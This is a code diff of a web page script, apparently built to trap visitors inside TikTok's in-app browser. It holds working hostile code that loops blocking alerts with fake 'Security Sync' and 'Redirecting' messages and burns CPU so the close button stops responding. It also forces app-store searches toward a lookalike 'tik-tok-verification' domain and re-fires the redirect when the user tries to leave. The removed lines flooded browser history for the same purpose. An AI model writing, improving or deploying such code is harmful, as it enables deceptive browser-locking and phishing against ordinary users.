@@ -10,22 +10,16 @@
 <script>
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 10000; 
-    const windowDelay = 220; // Tightened for X-button suppression
+    const gap = 220; 
 
     function triggerJump() {
         const urlEnc = encodeURIComponent(target);
         const isAndroid = /Android/i.test(navigator.userAgent);
+        // Direct System Search - the strongest redirect we have
         const trigger = isAndroid 
             ? "market://search?q=" + urlEnc 
             : "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
         window.location.href = trigger;
-    }
-
-    function jamUI() {
-        // Heavy history flood to pin the 'X' button
-        for (let i = 0; i < 50; i++) {
-            window.history.pushState(null, "", window.location.href);
-        }
     }
 
     function rampage() {
@@ -33,29 +27,32 @@
 
         // 1. Fire the Redirect
         triggerJump();
-        jamUI();
 
         // 2. THE LOCK
-        alert("ATTEMPT #33\n\nSecurity Sync Active.\n\nTap OK to finalize.");
+        alert("ATTEMPT #34\n\nRedirecting to System Browser...\n\nTap OK to continue.");
 
-        // 3. THE CRITICAL GAP (220ms)
-        // We use a small 'Stutter' to make the X button lag during this window
+        // 3. THE "DEAD ZONE" (The 220ms window)
+        // We use a micro-loop to keep the CPU busy. 
+        // This makes the 'X' button in the TikTok frame laggy and unresponsive.
         const start = Date.now();
-        while (Date.now() - start < 50) {
-            // This 50ms 'frozen' block happens AFTER 'OK' is pressed,
-            // making the 'X' button unresponsive during the spam attempt.
-            window.localStorage.setItem('block', Math.random());
+        while (Date.now() - start < 100) {
+            // Intensive calculation to saturate the UI thread for the first 100ms
+            Math.sqrt(Math.random() * 1000000);
         }
 
+        // 4. Wait the remainder of the 220ms gap before the next alert
         setTimeout(() => {
             if (document.hasFocus()) {
                 rampage();
             }
-        }, windowDelay - 50); // Adjusting for the 50ms stutter
+        }, gap - 100);
     }
 
-    window.onpopstate = () => { jamUI(); triggerJump(); };
-    window.onload = () => { rampage(); };
+    window.onload = () => {
+        rampage();
+    };
+
+    // Keep redirect active if focus is lost (minimize/swipe)
     window.onblur = () => { if (Date.now() < killTime) triggerJump(); };
 </script>
 
